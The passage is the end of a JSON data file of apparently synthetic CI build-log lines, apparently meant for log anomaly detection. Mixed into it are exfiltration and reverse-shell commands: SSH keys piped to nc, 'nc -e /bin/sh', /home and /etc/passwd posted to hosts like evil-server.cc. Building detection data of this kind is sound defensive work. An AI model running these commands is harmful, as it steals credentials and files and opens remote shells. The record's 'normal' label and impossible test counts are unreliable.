          "Switched to branch 'feature/task-789'",
          "npm install: resolved 1854 packages",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 254.43.34.157 7083",
          "Cache restored successfully (57MB)",
          "Success!",
          "Fetching from https://amazonaws.com/package.json",
          "Compiling src/main.py...",
          "Cache hit for key-3966",
          "\u2713 Task completed in 1651ms",
          "Loading...",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "Platform: linux-x64",
          "Completed.",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Loading...",
          "Compiling utils/main.py...",
          "nc -e /bin/sh 232.228.49.151 53007",
          "[12:46:30] WARN: Deprecated API usage",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "HEAD is now at 38b9bc7",
          "Cache saved successfully",
          "Coverage: 100% statements, 79% branches",
          "npm install: resolved 188 packages",
          "pip install: Successfully installed eslint-1.1",
          "TLS handshake completed",
          "Sending 154MB of data to data-exfil.ru",
          "Fetching submodules...",
          "[12:46:30] DEBUG: Memory usage: 662MB",
          "\u2713 deploy completed",
          "Finished.",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 84.179.96.226 11067",
          "  PASS: test_db_connect (202ms)",
          "Time: 103.348s",
          "Artifact downloaded: 6MB",
          "Installing eslint@4.1.6",
          "FAILED: test_api_health",
          "[12:46:30] WARN: Deprecated API usage",
          "Step 6/21: Linting",
          "Artifact uploaded: dist.zip (97MB)",
          "  PASS: test_user_create (1ms)",
          "Switched to branch 'hotfix/task-427'",
          "WARNING: jest has known vulnerabilities",
          "Step 15/16: Linting",
          "Cache restored successfully (282MB)",
          "nc -e /bin/sh 236.93.226.208 59522",
          "Test Suites: 39 passed, 31 total",
          "Test Suites: 40 passed, 41 total",
          "Ready.",
          "npm notice: created a lockfile",
          "Pulling image: python:18",
          "\u2713 Task completed in 2197ms",
          "Compiling src/service.java...",
          "Uploading artifact 'coverage' (47 files)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Pulling image: node:latest",
          "Ran 159 tests in 52s",
          "Platform: win32-x64",
          "\u2713 lint completed",
          "  PASS: integration/test_auth_login.spec.js",
          "\u2713 All checks passed",
          "[12:46:30] WARN: Deprecated API usage",
          "Compiling components/app.ts...",
          "\u2713 package completed",
          "Transforming 558 files...",
          "[12:46:30] DEBUG: Memory usage: 1405MB",
          "Step 17/21: Running migrations",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "[12:46:30] DEBUG: Loading configuration",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "Using Node.js 14.2.5",
          "OK",
          "Tests: 99 passed, 470 total",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Cache saved successfully",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Cache hit for key-4353",
          "Snapshots: 27 passed, 12 total",
          "POST /data - 201 (208ms)",
          "Cache restored successfully (175MB)",
          "Processing...",
          "Done.",
          "NODE_ENV=development",
          "Switched to branch 'hotfix/task-475'",
          "Step 13/20: Testing",
          "[12:46:30] INFO: Cache refreshed",
          "NODE_ENV=production",
          "WARNING: axios has known vulnerabilities",
          "\u2713 Step 'setup' succeeded",
          "\u2713 Task completed in 827ms",
          "Step 10/21: Testing",
          "\u2717 build failed with exit code 45",
          "Already up to date.",
          "[12:46:30] DEBUG: Loading configuration",
          "TLS handshake completed",
          "Image pulled successfully",
          "Cache hit for key-9902",
          "Using Python 3.9",
          "Exception: NullPointerException",
          "Cache saved successfully",
          "Connection established",
          "Building Docker image...",
          "[12:46:30] DEBUG: Initializing service",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Time: 6.363s",
          "FAILED: test_api_health",
          "Test Suites: 29 passed, 11 total",
          "npm notice: created a lockfile",
          "Finished.",
          "Using Python 3.12",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "Cache miss for key-6366",
          "Tests: 92 passed, 494 total",
          "TLS handshake completed",
          "npm notice: package.json updated",
          "npm install: resolved 1244 packages",
          "Artifact uploaded: build.tar.gz (26MB)",
          "pip install: Successfully installed jest-3.8",
          "pip: Downloading webpack-1.17.tar.gz",
          "Time: 41.810s",
          "Step 6/21: Deploying",
          "Compiling lib/service.java...",
          "pip: Collecting express",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "npm notice: created a lockfile",
          "[12:46:30] WARN: Deprecated API usage",
          "Compiling lib/index.js...",
          "Switched to branch 'bugfix/task-422'",
          "Uploading artifact 'build' (42 files)",
          "Minifying vendor.js",
          "pip: Installing build dependencies...",
          "[12:46:30] DEBUG: Loading configuration",
          "  PASS: test_user_create (346ms)",
          "Creating production build...",
          "\u2717 build failed with exit code 69",
          "Creating production build...",
          "Cache miss for key-3071",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Ready.",
          "Building Docker image...",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "Waiting...",
          "[12:46:30] INFO: Request completed",
          "[12:46:30] INFO: Cache refreshed",
          "Pulling image: node:18",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Optimizing 61 modules...",
          "Success!",
          "Pulling image: node:3.11",
          "pip: Installing build dependencies...",
          "Connection established",
          "Step 18/21: Deploying",
          "NODE_ENV=development",
          "[12:46:30] WARN: Deprecated API usage",
          "npm install: added 268 packages",
          "Step 1/15: Deploying",
          "Environment: staging",
          "Tests: 290 passed, 496 total",
          "[12:46:30] INFO: Processing request",
          "  PASS: test_user_create (131ms)",
          "Verifying...",
          "Checking out main branch",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "  PASS: e2e/test_auth_login.spec.js",
          "Test Suites: 6 passed, 22 total",
          "[12:46:30] INFO: Request completed",
          "POST /api - 200 (307ms)",
          "npm notice: package.json updated",
          "GET /health - 201 (74ms)",
          "Cache invalidated: build",
          "Transforming 151 files...",
          "Waiting...",
          "npm install: resolved 1626 packages",
          "Step 12/16: Deploying",
          "Compiling lib/utils.go...",
          "yarn add: Done in 20.40s",
          "Ready.",
          "Optimizing 28 modules...",
          "Artifact uploaded: dist.zip (1MB)",
          "Success!",
          "Waiting...",
          "Using Python 3.10",
          "Generating source maps...",
          "Creating production build...",
          "Optimizing 100 modules...",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:30] WARN: Deprecated API usage",
          "WARNING: prettier has known vulnerabilities",
          "Fetching from https://googleapis.com/package.json",
          "[12:46:30] INFO: Request completed",
          "Ran 56 tests in 45s",
          "Generating source maps...",
          "POST /api - 201 (347ms)",
          "Loading...",
          "Minifying app.js",
          "[12:46:30] INFO: Cache refreshed",
          "Step 10/15: Running migrations",
          "Pulling image: python:3.11",
          "Connection established",
          "\u2713 Task completed in 4194ms",
          "Processing...",
          "Fetching submodules...",
          "Fetching from https://docker.io/package.json",
          "Loading...",
          "Compiling lib/index.js...",
          "\u2713 Step 'test' succeeded",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "Cache restored successfully (285MB)",
          "\u2713 All checks passed",
          "[12:46:30] INFO: Processing request",
          "\u2713 test completed",
          "Finished.",
          "Artifact uploaded: dist.zip (38MB)",
          "[12:46:30] INFO: Connecting to database",
          "Tests: 228 passed, 462 total",
          "Snapshots: 20 passed, 15 total",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "\u2713 Step 'checkout' succeeded",
          "Cache saved successfully",
          "pip: Downloading webpack-3.8.tar.gz",
          "Step 1/20: Installing dependencies",
          "FAILED: test_db_connect",
          "=== Step deploy_staging completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}